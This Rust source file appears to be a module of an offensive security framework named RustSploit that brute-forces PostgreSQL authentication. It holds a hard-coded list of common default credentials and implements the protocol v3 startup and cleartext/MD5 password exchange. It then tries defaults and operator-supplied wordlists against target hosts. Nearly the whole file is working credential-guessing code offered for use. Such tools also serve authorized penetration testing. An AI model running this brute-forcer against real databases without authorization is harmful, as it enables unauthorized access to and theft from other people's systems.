//! PostgreSQL credential brute-force.
//!
//! Single-target probe — the scheduler handles CIDR / random / file / multi
//! fan-out. Each invocation tries default credentials first, then iterates
//! over operator-supplied wordlists via `crate::utils::creds_helper`.

use anyhow::{Context, Result};
use crate::module::{ModuleCtx, ModuleOutcome};
use std::time::Duration;

use crate::module_info::{ModuleInfo, ModuleRank};
use crate::utils::creds_helper::{self, CredsRun};
use crate::utils::LoginResult;

const DEFAULT_PG_PORT: u16 = 5432;

/// Common defaults — covers Docker images, dev installs, IoT appliances.
const DEFAULT_PG_CREDS: &[(&str, &str)] = &[
    ("postgres", "postgres"),
    ("postgres", ""),
    ("postgres", "password"),
    ("postgres", "admin"),
    ("postgres", "root"),
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "root"),
];

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "PostgreSQL Bruteforce".to_string(),
        description:
            "Tests PostgreSQL authentication via the protocol v3 startup flow. Cleartext (R 3) \
             and MD5 (R 5) auth methods supported; SASL/GSS/SSPI fall through as unsupported. \
             Tries common defaults first, then operator-supplied wordlists. Single-target — \
             scheduler does CIDR / random / file fan-out."
                .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://www.postgresql.org/docs/current/protocol-flow.html".to_string(),
        ],
        disclosure_date: None,
        rank: ModuleRank::Normal,
    }
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx.target.as_single().context("postgres_bruteforce requires a single-host target")?;
    creds_helper::run(
        target,
        CredsRun {
            service_name: "postgres",
            default_port: DEFAULT_PG_PORT,
            source_module: "creds/generic/postgres_bruteforce",
            defaults: DEFAULT_PG_CREDS,
            password_only: false,
        },
        |host: String, port: u16, user: String, pass: String| async move {
            probe(&host, port, &user, &pass).await
        },
    )
    .await
}

/// One PostgreSQL auth attempt. Sends the v3 startup-message with the
/// supplied user, then either Password / Md5 response on demand.
/// Returns Success on `AuthenticationOk` (R 0), AuthFailed on
/// `ErrorResponse` (E), retryable Error on connection issues.
async fn probe(host: &str, port: u16, user: &str, pass: &str) -> LoginResult {
    use tokio::io::AsyncWriteExt;

    let timeout = Duration::from_secs(5);
    let addr = format!("{}:{}", host, port);
    let mut stream = match crate::utils::creds_helper::connect_with_timeout(&addr, timeout).await {
        Ok(s) => s,
        Err(e) => {
            return LoginResult::Error {
                message: format!("connect: {e}"),
                retryable: true,
            };
        }
    };

    let mut params = Vec::<u8>::new();
    params.extend_from_slice(b"user\0");
    params.extend_from_slice(user.as_bytes());
    params.push(0);
    params.extend_from_slice(b"database\0");
    params.extend_from_slice(user.as_bytes()); // db = user (PG default)
    params.push(0);
    params.push(0); // trailing null

    let total_len: u32 = 4 + 4 + params.len() as u32;
    let mut msg = Vec::with_capacity(total_len as usize);
    msg.extend_from_slice(&total_len.to_be_bytes());
    msg.extend_from_slice(&196608u32.to_be_bytes()); // protocol 3.0
    msg.extend_from_slice(&params);

    if let Err(e) = stream.write_all(&msg).await {
        return LoginResult::Error {
            message: format!("write startup: {e}"),
            retryable: true,
        };
    }

    let mut header = [0u8; 5];
    loop {
        if let Err(e) =
            crate::utils::creds_helper::read_exact_with_timeout(&mut stream, &mut header, timeout)
                .await
        {
            return LoginResult::Error {
                message: format!("read header: {e}"),
                retryable: true,
            };
        }
        let msg_type = header[0];
        let msg_len = u32::from_be_bytes([header[1], header[2], header[3], header[4]]);
        if !(5..=64 * 1024).contains(&msg_len) {
            return LoginResult::Error {
                message: format!("invalid message length {msg_len}"),
                retryable: false,
            };
        }
        let body_len = (msg_len - 4) as usize;
        let mut body = vec![0u8; body_len];
        if body_len > 0
            && let Err(e) = crate::utils::creds_helper::read_exact_with_timeout(
                &mut stream,
                &mut body,
                timeout,
            )
            .await
            {
                return LoginResult::Error {
                    message: format!("read body: {e}"),
                    retryable: true,
                };
            }
        match msg_type {
            b'R' => {
                if body.len() < 4 {
                    return LoginResult::Error {
                        message: "short auth msg".to_string(),
                        retryable: false,
                    };
                }
                let auth_type = u32::from_be_bytes([body[0], body[1], body[2], body[3]]);
                match auth_type {
                    0 => return LoginResult::Success,
                    3 => {
                        let mut pw_msg = Vec::new();
                        pw_msg.push(b'p');
                        let plen = (4 + pass.len() + 1) as u32;
                        pw_msg.extend_from_slice(&plen.to_be_bytes());
                        pw_msg.extend_from_slice(pass.as_bytes());
                        pw_msg.push(0);
                        if let Err(e) = stream.write_all(&pw_msg).await {
                            return LoginResult::Error {
                                message: format!("write pw: {e}"),
                                retryable: true,
                            };
                        }
                    }
                    5 => {
                        if body.len() < 8 {
                            return LoginResult::Error {
                                message: "short md5 salt".to_string(),
                                retryable: false,
                            };
                        }
                        let salt = &body[4..8];
                        let inner = format!(
                            "{:x}",
                            md5::compute(format!("{}{}", pass, user).as_bytes())
                        );
                        let mut hash_input = Vec::with_capacity(inner.len() + 4);
                        hash_input.extend_from_slice(inner.as_bytes());
                        hash_input.extend_from_slice(salt);
                        let outer = format!("md5{:x}", md5::compute(&hash_input));
                        let mut pw_msg = Vec::new();
                        pw_msg.push(b'p');
                        let plen = (4 + outer.len() + 1) as u32;
                        pw_msg.extend_from_slice(&plen.to_be_bytes());
                        pw_msg.extend_from_slice(outer.as_bytes());
                        pw_msg.push(0);
                        if let Err(e) = stream.write_all(&pw_msg).await {
                            return LoginResult::Error {
                                message: format!("write md5: {e}"),
                                retryable: true,
                            };
                        }
                    }
                    other => {
                        return LoginResult::Error {
                            message: format!("unsupported auth method {other}"),
                            retryable: false,
                        };
                    }
                }
            }
            b'E' => return LoginResult::AuthFailed,
            _ => continue,
        }
    }
}

crate::register_native_module!(crate::module::Category::Creds, "generic/postgres_bruteforce", native);
